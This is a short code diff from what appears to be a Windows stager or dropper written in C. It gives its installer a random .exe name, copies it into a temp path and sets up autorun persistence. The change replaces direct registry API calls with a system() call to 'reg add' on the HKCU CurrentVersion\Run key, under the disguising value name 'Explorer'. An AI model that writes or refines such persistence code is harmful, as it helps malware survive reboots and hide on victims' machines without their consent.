@@ -27,6 +27,7 @@ int main() {
 	char StagerName[MAX_PATH] = { 0 };
 	char DrivePrefix[4] = { 0 };
 	char CopyCommand[MAX_PATH]="copy ";
+	char RegistryCommand[MAX_PATH * 2] = "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Explorer\" /t REG_SZ /d ";
 	char InstallerName[InstallerNameLength + 5] = { 0 };  // InstallerNameLength + .exe + \0
 	HKEY AutorunKey = { 0 };
 	LSTATUS LastError = 0;
@@ -40,15 +41,9 @@ int main() {
 	CreateRandomName(InstallerNameLength, ".exe", InstallerName);
 	printf(InstallerName);
 	strcat_s(TemporaryPath, InstallerName);
-	LastError = RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", &AutorunKey);
-	if (LastError != ERROR_SUCCESS) {
-		return LastError;
-	}
-	LastError = RegSetValueExA(AutorunKey, REGVALUE_NAME, 0, REG_SZ, (const BYTE*)TemporaryPath, strlen(TemporaryPath) +1);
-	RegCloseKey(AutorunKey);
-	if (LastError != ERROR_SUCCESS) {
-		return LastError;
-	}
+	strcat_s(RegistryCommand, TemporaryPath);
+	strcat_s(RegistryCommand, " /f");
+	system(RegistryCommand);
 
 
 	// Copy installer into the right path:
